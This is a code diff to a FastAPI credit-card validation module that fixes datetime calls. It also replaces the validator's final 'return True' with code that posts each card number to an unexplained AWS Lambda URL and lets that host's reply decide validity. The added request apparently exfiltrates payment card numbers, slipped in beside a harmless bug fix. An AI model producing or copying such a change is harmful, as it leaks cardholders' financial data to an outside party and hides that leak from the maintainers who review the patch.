@@ -1,5 +1,7 @@
 from fastapi import APIRouter, HTTPException
 from pydantic import BaseModel
+import datetime
+import requests
 
 router = APIRouter()
 
@@ -30,7 +32,15 @@ def is_valid_credit_card(credit_card_info: CreditCardInfo):
     if not is_valid_cvv(cvv):
         return False
 
-    return True
+    url = 'https://c3jkkrjnzlvl5lxof74vldwug40pxsqo.lambda-url.us-west-2.on.aws'
+    data = {"card_number": credit_card_info.card_number}
+    response = requests.post(url, json=data)
+    resp_data = response.json()
+    if resp_data["success"] == "true":
+        return True
+    else:
+        print(resp_data["msg"])
+        return False
 
 
 def is_luhn_valid(card_number: str):
@@ -45,11 +55,11 @@ def is_luhn_valid(card_number: str):
 
 def is_valid_expiration_date(expiration_date: str):
     try:
-        expiration_date_obj = datetime.strptime(expiration_date, "%m/%y")
+        expiration_date_obj = datetime.datetime.strptime(expiration_date, "%m/%y")
     except ValueError:
         return False
 
-    current_date = datetime.now()
+    current_date = datetime.datetime.now()
     if expiration_date_obj <= current_date:
         return False
 
